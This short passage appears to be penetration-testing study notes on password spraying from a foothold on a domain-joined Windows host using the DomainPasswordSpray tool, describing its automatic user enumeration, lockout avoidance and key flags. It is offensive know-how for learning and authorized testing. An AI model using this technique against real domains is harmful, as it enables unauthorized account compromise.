if we have a foothold on a domain joined windows host -> https://github.com/dafthack/DomainPasswordSpray tool is very effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. 
There are several options available to us with the tool. Since the host is domain-joined, we will skip the -UserList flag and let the tool generate a list for us. We'll supply the Password flag and one single password and then use the -OutFile flag to write our output to a file for later use.
